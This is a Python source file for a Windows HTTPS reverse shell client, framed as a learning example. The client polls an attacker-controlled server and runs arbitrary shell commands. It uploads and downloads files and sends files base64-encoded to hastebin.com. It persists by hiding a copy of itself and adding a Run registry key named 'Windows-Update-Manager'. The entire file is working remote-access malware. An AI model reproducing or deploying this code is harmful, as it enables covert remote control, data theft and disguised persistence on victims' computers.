#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""

Sample HTTPS reverse shell client example to learn Python language

MIT License
Copyright (c) 2019, Diogo G. Soares

Permission is hereby granted, free of charge, to any person
obtaining a copy of this software and associated documentation
files (the "Software"), to deal in the Software without
restriction, including without limitation the rights to use,
copy, modify, merge, publish, distribute, sublicense, and/or
sell copies of the Software, and to permit persons to whom the
Software is furnished to do so, subject to the following
conditions:

The above copyright notice and this permission notice shall be
included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
OTHER DEALINGS IN THE SOFTWARE.
"""

import os
import sys
import subprocess
import shutil
import ctypes
import winreg
import time
import argparse
import base64
import json

import requests

__author__ = "dggsoares"
__copyright__ = "Copyright (c) 2019, Diogo G. Soares"
__description__ = 'Simple HTTPS reverse shell client example to learn Python language'
__license__ = "MIT"
__version__ = "1.0"
__maintainer__ = "Diogo G. Soares"
__email__ = "dggsoares at gmail"
__status__ = "Development"
__date__ = 20190411

requests.packages.urllib3.disable_warnings()  # Disable SSL verify warnings


def get(command, session, base_url):
    get, path = command.split('&')

    if os.path.exists(path):
        with open(path, 'rb') as local_file:
            files = {'file': local_file}
            headers = {'Function': 'get_file',
                       'Filename': f'{path.split("/")[-1]}'
                       }
            session.post(base_url, files=files, headers=headers)
    else:
        session.post(url=base_url, data='[X] File not found!')


def put(command, session, base_url):
    put, path = command.split('&')
    post_url = base_url + path
    post_url_response = session.post(
        post_url, headers={'Function': 'put_file'})

    file_name = path.split('/')[-1]
    with open(file_name, 'wb') as local_file:
        for chunk in post_url_response.iter_content(chunk_size=128):
            local_file.write(chunk)


def system_recon():
    source = sys.argv[0]
    file_name = sys.argv[0].split('\\')[-1]
    user_profile = os.getenv('userprofile')
    destination = user_profile + '\\Documents\\' + file_name
    return source, file_name, user_profile, destination


def persistence(command, session, base_url):
    source, file_name, user_profile, destination = system_recon()

    if os.path.exists(destination):
        session.post(
            url=base_url, data='\t[X] System already touched, nothing to do...')
    else:
        output_server = ''

        shutil.copyfile(source, destination)
        output_server += f'\t[X] File "{file_name}" copy complete...\n'

        ctypes.windll.kernel32.SetFileAttributesW(destination, 0x02)
        output_server += f'\t[X] "{file_name}" hiding complete...\n'

        with winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_ALL_ACCESS
        ) as key:
            winreg.SetValueEx(key, 'Windows-Update-Manager',
                              0, winreg.REG_SZ, destination)

        output_server += f'\t[X] Register update...\n'
        session.post(url=base_url, data=output_server)


def persistence_remove(command, session, base_url):
    source, file_name, user_profile, destination = system_recon()

    if os.path.exists(destination):
        output_server = ''
        os.remove(destination)
        output_server += f'\t[X] File "{file_name}" deleted...\n'

        with winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_ALL_ACCESS
        ) as key:
            winreg.DeleteValue(
                key,
                'Windows-Update-Manager'
            )

        output_server += f'\t[X] Register cleaned...\n'
        session.post(url=base_url, data=output_server)
    else:
        session.post(url=base_url, data='\t[X] System not persisted...\n')


def cd(command, session, base_url):
    try:
        command, path = command.split()
        os.chdir(path)
    except ValueError as v:
        shell_commands(command, session, base_url)
    except Exception as e:
        session.post(url=base_url, data=e)


def exfil(command, session, base_url):
    get, path = command.split('&')
    hastebin_url = 'https://hastebin.com/documents/'

    if os.path.exists(path):
        file_name = path.split("/")[-1]
        session.post(
            url=base_url, data=f'\t[+] Exfiltration \"{file_name}\" file...')
        with open(path, 'rb') as local_file:
            encoded_file = base64.b64encode(local_file.read())
            post_request = requests.post(
                hastebin_url, data=encoded_file, verify=False)
            link_file = json.loads(post_request.text)
            session.post(
                url=base_url, data=f'\t[+] File link: {"".join(hastebin_url.split("d")[:1]) + link_file["key"]}')
    else:
        session.post(url=base_url, data='[X] File not found!')


def shell_commands(command, session, base_url):
    cmd = subprocess.Popen(command,
                           shell=True,
                           stdout=subprocess.PIPE,
                           stderr=subprocess.PIPE,
                           stdin=subprocess.PIPE,
                           )
    session.post(url=base_url, data=cmd.stdout.read())
    session.post(url=base_url, data=cmd.stderr.read())


def main(args):
    base_url = f'https://{args.server}:{args.port}'
    session = requests.Session()
    session.trust_env = False
    session.verify = False

    while True:
        r = session.get(base_url)
        command = r.text

        if 'quit' in command:
            break
        elif 'get' in command:
            get(command, session, base_url)
        elif 'put' in command:
            put(command, session, base_url)
        elif 'persistence' in command:
            persistence(command, session, base_url)
        elif 'remove' in command:
            persistence_remove(command, session, base_url)
        elif 'cd' in command:
            cd(command, session, base_url)
        elif 'exfil' in command:
            exfil(command, session, base_url)
        else:
            shell_commands(command, session, base_url)

        time.sleep(1)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description=__description__,
        epilog=f'Built by {__author__}. Version {__date__}',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )

    parser.add_argument(
        '-s', '--server',
        help='IP or hostname of the attacker machine',
        default='10.3.16.120')

    parser.add_argument(
        '-p',
        '--port',
        help='Port for HTTPS service of the attacker machine',
        default=4443)

    args = parser.parse_args()
    main(args)
